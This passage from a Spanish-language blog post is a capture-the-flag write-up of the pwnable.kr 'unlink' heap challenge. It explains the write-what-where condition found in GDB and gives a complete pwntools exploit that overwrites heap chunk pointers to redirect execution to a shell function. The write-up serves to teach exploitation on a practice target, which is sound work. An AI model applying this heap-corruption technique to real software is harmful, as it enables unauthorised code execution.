+<p>Debido a esto, debemos de hacer que <code class="language-plaintext highlighter-rouge">B-&gt;fd</code> o <code class="language-plaintext highlighter-rouge">B-&gt;bk</code> siempre apunten a una direccion de memoria con permisos de escritura, donde debemos de tener en cuenta que <code class="language-plaintext highlighter-rouge">B-&gt;bk</code> se escribira 4 bytes despues de la direccion de <code class="language-plaintext highlighter-rouge">B-&gt;fd</code></p>
+
+<h2 id="analisis-con-gdb">Analisis con GDB</h2>
+
+<p>En las ultimas linea de la funcion main, cuando se hace el llamado de <code class="language-plaintext highlighter-rouge">unlink</code>:</p>
+
+<p><img src="/assets/img/unlink/unlink1.png" alt=""></p>
+
+<p>Tenemos algo interesante, El contenido en la dirección <code class="language-plaintext highlighter-rouge">ebp-4</code> se copia en <code class="language-plaintext highlighter-rouge">ecx</code> y antes de que devuelva el valor <code class="language-plaintext highlighter-rouge">ecx-4</code> se asigna al <code class="language-plaintext highlighter-rouge">esp</code>, entonces el programa regresará a la dirección que este en <code class="language-plaintext highlighter-rouge">ecx-4</code>.</p>
+
+<h2 id="write-what-where">Write-What-Where</h2>
+
+<p>Una vez ejecutando el programa y pasandole varios bytes hasta que ocurra el overflow, podemos ver que tenemos el control de <code class="language-plaintext highlighter-rouge">eax</code> y <code class="language-plaintext highlighter-rouge">edx</code>:</p>
+
+<p><img src="/assets/img/unlink/unlink2.png" alt=""></p>
+
+<p>Y si continuamos la ejecucion del programa, lo que tiene el <code class="language-plaintext highlighter-rouge">eip</code> es la direccion <code class="language-plaintext highlighter-rouge">0x8048521</code> y que ejecuta la intruccion: <code class="language-plaintext highlighter-rouge">DWORD PTR [eax+0x4], edx</code>, pero como <code class="language-plaintext highlighter-rouge">edx</code> tiene una direccion invalida entonces va a petar. Y aqui es cuando la instruccion <code class="language-plaintext highlighter-rouge">mov</code> nos proporciona la condicion <code class="language-plaintext highlighter-rouge">write-what-where</code>, asi que con esta condicion podemos sobreescribir el <code class="language-plaintext highlighter-rouge">ebp-0x4</code> de cuando de hace el llamado a la funcion <code class="language-plaintext highlighter-rouge">unlink</code> en la funcion <code class="language-plaintext highlighter-rouge">main</code>.</p>
+
+<p>Y esto es bastante interesante por que si sobrescribimos el valor de <code class="language-plaintext highlighter-rouge">ebp-4</code> con una dirección del heap, entonces el flujo de ejecución ira a lo que esté escrito 4 bytes antes de lo que apunta esa dirección, y como tenemos control total sobre el heap, podemos escribir la dirección de la funcion <code class="language-plaintext highlighter-rouge">shell()</code> en esa parte.</p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Entonces tenemos que:</p>
+
+<ul>
+  <li>Sobreecribiremos <code class="language-plaintext highlighter-rouge">B-&gt;bk</code> con la dirección <code class="language-plaintext highlighter-rouge">ebp-4</code>
+</li>
+  <li>Agregar 0x10 al stack para llegar al valor que queremos</li>
+  <li>Hacer que <code class="language-plaintext highlighter-rouge">B-&gt;fd</code> sea igual a una dirección del heap que podamos controlar, más 4 bytes, y podemos usar <code class="language-plaintext highlighter-rouge">A-&gt;buf</code>
+</li>
+  <li>Y por ultimo escribir la dirección de la función <code class="language-plaintext highlighter-rouge">shell()</code> en A-&gt;buf.</li>
+</ul>
+
+<h3 id="exploit">Exploit</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="nf">ssh</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="sh">'</span><span class="s">unlink</span><span class="sh">'</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">pwnable.kr</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/unlink/unlink</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+
+<span class="n">shell_addr</span> <span class="o">=</span> <span class="mh">0x080484eb</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">heap</span><span class="o">+</span><span class="mi">8</span>
+<span class="n">ebp</span> <span class="o">=</span> <span class="n">stack</span><span class="o">+</span><span class="mi">20</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">)</span> <span class="c1"># A-&gt;buf
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">12</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># B-&gt;fd
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># B-&gt;bk
+</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/unlink/exploit.png" alt=""></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/img/unlink/waifu.gif" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/explotacion%20binaria/2023/04/15/htb-entity.html" title="HackTheBoo Entity - Type Confusion via Union">HackTheBoo Entity - Type Confusion via...</a><a class="next" href="/explotacion%20binaria/2023/04/24/rop-emporium-callme.html" title="ROP emporium callme - Llamando multiples funciones">ROP emporium callme - Llamando multiples...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/2023/06/28/xxs-reflejado.html" title="ROP emporium callme - Llamando multiples funciones">Simple XSS reflejado en un sitio web real</a></li>
+<li><a class="post-link" href="/un%20poco%20de%20pentesting/2023/05/29/UPDP-ssti.html" title="ROP emporium callme - Llamando multiples funciones">Un Poco de Pentesting - SSTI en Jinja2</a></li>
+<li><a class="post-link" href="/un%20poco%20de%20pentesting/2023/03/28/UPDP-sqli.html" title="ROP emporium callme - Llamando multiples funciones">Un Poco de Pentesting - SQL Injections</a></li>
+<li><a class="post-link" href="/maldev/2023/07/17/heap-queueUserApc.html" title="ROP emporium callme - Llamando multiples funciones">Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert...</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
